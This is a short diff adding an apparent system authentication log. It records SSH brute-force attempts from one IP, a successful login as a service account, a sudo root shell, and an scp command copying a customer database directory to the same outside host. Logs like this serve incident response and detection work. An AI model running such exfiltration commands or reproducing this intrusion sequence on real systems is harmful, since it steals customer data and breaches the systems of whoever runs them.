@@ -1,0 +1,8 @@
+2026-07-27 02:14:01 sshd[8821]: Failed password for invalid user admin from 185.220.101.47 port 51234 ssh2
+2026-07-27 02:14:03 sshd[8821]: Failed password for invalid user admin from 185.220.101.47 port 51234 ssh2
+2026-07-27 02:14:07 sshd[8821]: Failed password for root from 185.220.101.47 port 51240 ssh2
+2026-07-27 02:15:44 sshd[8830]: Accepted password for svc_backup from 185.220.101.47 port 51298 ssh2
+2026-07-27 02:15:44 sshd[8830]: pam_unix(sshd:session): session opened for user svc_backup by (uid=0)
+2026-07-27 02:16:12 sudo: svc_backup : TTY=pts/2 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/bin/bash
+2026-07-27 02:19:03 sudo: svc_backup : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp -r /var/db/customers backup@185.220.101.47:/tmp/
+2026-07-27 02:41:19 sshd[8830]: pam_unix(sshd:session): session closed for user svc_backup
